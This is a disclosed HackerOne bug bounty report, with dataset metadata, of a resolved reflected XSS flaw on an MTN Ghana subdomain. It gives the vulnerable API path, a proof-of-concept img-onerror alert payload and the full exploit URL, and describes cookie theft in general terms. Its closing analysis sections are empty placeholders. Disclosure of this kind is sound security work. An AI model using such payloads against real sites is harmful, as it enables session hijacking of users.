---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1069527'
original_report_id: '1069527'
title: Reflected XSS on mtnhottseat.mtn.com.gh
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: mtn_group
created_at: '2021-01-01T03:55:44.182Z'
disclosed_at: '2021-05-24T07:38:00.883Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 19
asset_identifier: mtn.co.za
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on mtnhottseat.mtn.com.gh

## Metadata

- HackerOne Report ID: 1069527
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: mtn_group
- Disclosed At: 2021-05-24T07:38:00.883Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

hello dear

I have found Reflected XSS on mtnhottseat.mtn.com.gh
parameters injectable /api/v2/subscribe/;

my payload "><img src=x onerror=alert(document.domain)>

URL: https://mtnhottseat.mtn.com.gh/api/v2/subscribe/;%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E

{F1140524}

## Impact

Malicious JavaScript has access to all the same objects as the rest of the web page, including access to cookies and local storage, which are often used to store session tokens. If an attacker can obtain a user's session cookie, they can then impersonate that user.

Furthermore, JavaScript can read and make arbitrary modifications to the contents of a page being displayed to a user. Therefore, XSS in conjunction with some clever social engineering opens up a lot of possibilities for an attacker.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
